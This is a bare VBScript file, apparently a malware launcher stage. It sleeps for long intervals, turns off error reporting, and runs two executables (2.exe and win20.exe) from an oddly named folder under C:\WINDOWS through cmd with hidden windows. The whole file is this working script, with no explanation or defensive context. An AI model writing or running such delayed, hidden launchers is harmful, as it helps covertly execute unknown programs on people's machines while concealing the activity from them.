wscript.sleep 98000
on error resume next
Set ws = CreateObject("Wscript.Shell") 
ws.run "cmd /c C:\WINDOWS\bsjkky\2.exe",vbhide 
wscript.sleep 1680000
set ws=wscript.createobject("wscript.shell")
ws.run "cmd /c C:\WINDOWS\bsjkky\win20.exe",vbhide